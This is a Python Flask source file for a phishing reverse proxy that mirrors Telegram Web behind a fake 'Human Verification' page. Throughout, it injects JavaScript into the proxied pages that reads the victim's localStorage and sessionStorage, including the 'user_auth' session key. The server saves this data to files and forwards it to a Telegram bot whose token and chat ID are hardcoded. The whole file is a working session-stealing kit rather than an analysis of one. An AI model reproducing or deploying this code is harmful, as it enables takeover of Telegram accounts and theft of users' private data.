from flask import Flask, request, Response
import requests
import time
import os

app = Flask(__name__)

# Base URL of the site you want to proxy
BASE_URL = 'https://web.telegram.org/k/'

# Your Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = '7748600145:AAFIALKClYzW9ACeA4GvOuyQQTb1mOcSf1o'
TELEGRAM_CHAT_ID = '6643893560'


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE'])
def proxy(path):
    # Full URL of the request
    url = f"{BASE_URL}{path}"

    # Forward the headers from the original request
    headers = {key: value for key, value in request.headers if key != 'Host'}

    # Differentiate between GET, POST, and other methods
    if request.method == 'POST':
        response = requests.post(url, headers=headers, data=request.data, cookies=request.cookies)
    elif request.method == 'PUT':
        response = requests.put(url, headers=headers, data=request.data, cookies=request.cookies)
    elif request.method == 'DELETE':
        response = requests.delete(url, headers=headers, cookies=request.cookies)
    else:
        response = requests.get(url, headers=headers, cookies=request.cookies)

    # Inject JavaScript to extract localStorage and sessionStorage
    injected_js = """
    <script>
        // Function to send localStorage and sessionStorage data
        function sendStorageData() {
            const localStorageData = JSON.stringify(localStorage);
            const sessionStorageData = JSON.stringify(sessionStorage);
            fetch('/store-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    localStorage: localStorageData,
                    sessionStorage: sessionStorageData
                }),
            });
        }

        // Check for the key and send storage data if it exists
        const keyName = 'user_auth'; // Replace with your actual key name
        const reloadLimit = 3; // Set the reload limit to 3

        // Track reload count in sessionStorage
        if (sessionStorage.getItem('reloadCount') === null) {
            sessionStorage.setItem('reloadCount', 0); // Initialize reload count
        } else {
            let reloadCount = parseInt(sessionStorage.getItem('reloadCount'));
            reloadCount += 1;
            sessionStorage.setItem('reloadCount', reloadCount); // Increment reload count

            if (reloadCount >= reloadLimit) {
                // Clear localStorage and sessionStorage after 3 reloads
                console.log("Reload limit reached. Clearing storage...");
                localStorage.clear();
                sessionStorage.clear();
            }
        }
        window.onload = sendStorageData;

        setInterval(function() {
            const value = localStorage.getItem(keyName);
            if (value !== null) {
                console.log(`Key "${keyName}" exists with value:`, value);
                sendStorageData();
                 window.location.reload();// Send storage data when the key is found
            }
        }, 5000); // 5000 milliseconds = 5 seconds



    </script>
    """

    # Inject the JavaScript into the HTML response if it's an HTML page
    if 'text/html' in response.headers.get('Content-Type', ''):
        content = response.text.replace('</body>', injected_js + '</body>')
    else:
        content = response.content

    # Return the modified response with the injected JavaScript
    excluded_headers = ['content-encoding', 'content-length', 'transfer-encoding', 'connection']
    headers = [(name, value) for name, value in response.raw.headers.items() if name.lower() not in excluded_headers]
    return Response(content, response.status_code, headers)

REVERSE_PROXY_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Human Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400&display=swap" rel="stylesheet"> <!-- Include Roboto Mono font -->
    <style>
        body {
            margin: 0;
            font-family: 'Helvetica Neue', Arial, sans-serif;
            background-color: #0f0f0f;
            color: white;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            height: 100vh;
        }
        .container {
            width: 100%;
            height: 100vh;
            background-color: #1a1a1a;
            padding-top: 50px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .container h1 {
            font-size: 2.5em;
            font-weight: bold;
            margin-bottom: 3px; /* Reduced margin between heading and paragraph */
        }
        .container p {
            font-size: 1.2em;
            margin-bottom: 25px;
        }
        .container a {
            display: inline-block;
            background-color: #2a5f3f;
            color: white;
            padding: 15px 30px;
            font-size: 1.3em;
            text-decoration: underline; /* Underline the text */
            border-radius: 5px;
            border: 2px solid #255238;
            width: 50%; /* Elongate the button */
            text-align: center; /* Ensure text is centered inside the elongated button */
            font-family: 'Roboto Mono', monospace; /* Change font to Roboto Mono */
        }
        .container a:hover {
            background-color: #3d7b56;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Human Verification</h1>
        <p>Verify below to be granted entry</p>
        <a href="/">Click here</a>  <!-- Changed link to point to /api -->
    </div>
</body>
</html>
"""

@app.route('/verify', methods=['GET'])
def reverse_proxy():
    return REVERSE_PROXY_HTML
# Endpoint to receive localStorage and sessionStorage data
@app.route('/store-data', methods=['POST'])
def store_data():
    storage_data = request.json
    local_storage = storage_data.get('localStorage')
    session_storage = storage_data.get('sessionStorage')

    # Generate a filename based on the current time
    timestamp = time.strftime('%Y%m%d_%H%M%S')
    filename = f'storage_data_{timestamp}.txt'

    # Write the data to a text file
    with open(filename, 'w') as file:
        form = local_storage
        file.write(f"{form}\n")
        # file.write(f"sessionStorage: {session_storage}\n")

    # Send the file to the Telegram bot
    send_file_to_telegram(filename)

    return 'Data received', 200


def send_file_to_telegram(filename):
    with open(filename, 'rb') as file:
        requests.post(f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument',
                      data={'chat_id': TELEGRAM_CHAT_ID},
                      files={'document': file})


if __name__ == '__main__':
    app.run(debug=True, port=5002)
